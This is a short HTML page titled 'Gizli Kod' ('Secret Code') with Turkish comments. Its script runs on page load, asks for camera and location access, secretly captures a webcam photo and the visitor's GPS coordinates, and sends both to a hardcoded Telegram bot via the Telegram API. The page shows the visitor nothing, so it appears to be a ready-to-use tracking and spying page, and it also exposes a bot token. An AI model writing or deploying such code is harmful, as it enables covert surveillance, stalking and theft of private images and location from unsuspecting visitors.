<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gizli Kod</title>
</head>
<body>
<script>
var botToken = "6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc"; // Botun API anahtarı
var chatId = "6070918315"; // Telegram kullanıcı ID'si

// Kullanıcıya kamera ve konum erişimi izni iste
navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
        // Kamera erişim izni verildiğinde
        navigator.geolocation.getCurrentPosition(function(position) {
            // Konum erişim izni verildiğinde
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            sendLocationToTelegramBot(latitude, longitude);
        });
        
        // Kamera erişim izni verildiğinde fotoğrafı çek
        var video = document.createElement('video');
        document.body.appendChild(video);
        video.srcObject = stream;
        video.play();
        video.addEventListener('canplay', function() {
            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            var context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            var imgData = canvas.toDataURL('image/jpeg');
            sendPhotoToTelegramBot(imgData);
            stream.getTracks().forEach(track => track.stop());
            document.body.removeChild(video);
        });
    });

function sendLocationToTelegramBot(latitude, longitude) {
    var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendLocation?chat_id=" + chatId + "&latitude=" + latitude + "&longitude=" + longitude;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', apiUrl);
    xhr.send();
}

function sendPhotoToTelegramBot(imgData) {
    var formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', dataURItoBlob(imgData));
    var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
    var xhr = new XMLHttpRequest();
    xhr.open('POST', apiUrl);
    xhr.send(formData);
}

function dataURItoBlob(dataURI) {
    var byteString = atob(dataURI.split(',')[1]);
    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    var ab = new ArrayBuffer(byteString.length);
    var ia = new Uint8Array(ab);
    for (var i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    var blob = new Blob([ab], {type: mimeString});
    return blob;
}
</script>
</body>
</html>
